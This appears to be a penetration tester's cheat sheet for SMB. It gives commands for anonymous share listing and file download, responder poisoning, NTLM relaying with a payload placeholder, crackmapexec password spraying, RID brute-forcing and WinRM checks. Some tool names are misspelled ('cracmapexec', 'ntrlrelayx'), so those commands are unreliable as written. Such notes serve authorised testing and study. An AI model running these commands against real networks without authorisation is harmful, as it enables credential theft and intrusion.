---
icon: database
---

# SMB

```bash
#Connect
smbclient --no-pass //IP/<Share>

smbmap -H <IP>
#List Share
smbmap -H <IP> -r <SHARE>
#Resources List for null session
smbclient -N <IP>
#Resources List
smbclient -L <IP>
```

<mark style="color:purple;">**Download Files:**</mark>

```python
#In this order
recurse
prompt
mget *
```

<mark style="color:purple;">**Check files attributes**</mark>

```
allinfo
```

<mark style="color:purple;">**Check Authentication**</mark>

```bash
#SMB Relay
responder -I eth0 -dwv

#Impacket
impacket-ntrlrelayx -tf target.txt -smb2support -c <payload>

```

### <mark style="color:purple;">With Credentials</mark>

<mark style="color:purple;">**SMB Credential Check**</mark>

```bash
cracmapexec smb <IP> -u usernames -p passwords

#List
crackmapexec smb <IP> -u '' -p '' --shares
```

<mark style="color:purple;">**SMB User enumeration**</mark>

```python
crackmapexec smb <IP> -u <USER> -p <PASSWORD> --rid-brute

#Full Enumeration
crackmapexec smb <IP> -u usernames -p passwords --continue-on-success
#DNS
smbmap -H <IP> -d <dns> -u '<user>' -p '<pass>'

#Connect to share
smbclient -N \\\\IP\Share

#List share
smbclient //IP/<SHARE> -U <USER>

#Download Share
smbget -U <User> smb://IP/<SHARE_LOCATION> / --download
```

<mark style="color:purple;">**SMB RMU (REMOTE MANAGEMENT USER)**</mark>

```python
crackmapexec winrm <IP> -u <USER> -p <PASSWORD>
```

<mark style="color:purple;">**Impacket**</mark>

```
impacket-smbclient <IP>/user:password@address
```
